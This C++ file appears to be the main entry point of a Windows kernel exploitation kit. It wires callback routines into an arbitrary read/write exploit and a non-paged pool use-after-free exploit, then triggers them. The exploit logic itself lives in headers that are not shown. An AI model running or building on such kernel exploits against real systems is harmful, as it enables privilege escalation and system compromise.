#include "AEK.h"
#include "Exploits.h"

int main() {
#ifdef ARAW

	CreateDevice();
	krnlmagic::ex.ArbitraryReadRoutine = ARRoutine;
	krnlmagic::ex.ArbitraryWriteRoutine = AWRoutine;
	krnlmagic::ex.Exploit();

#endif // ARAW



#ifdef NPP_UAF

	CreateDevice();

	aek::ex.AllocateTriggerPool = _AllocateTriggerPool;
	aek::ex.AllocateFakePool = _AllocateFakePool;
	aek::ex.FreeTriggerPool = _FreeTriggerPool;
	aek::ex.TriggerCallbackFunction = _TriggerCallbackFunction;
	aek::ex.Exploit();

#endif // NPP_UAF
	
	return 0;
}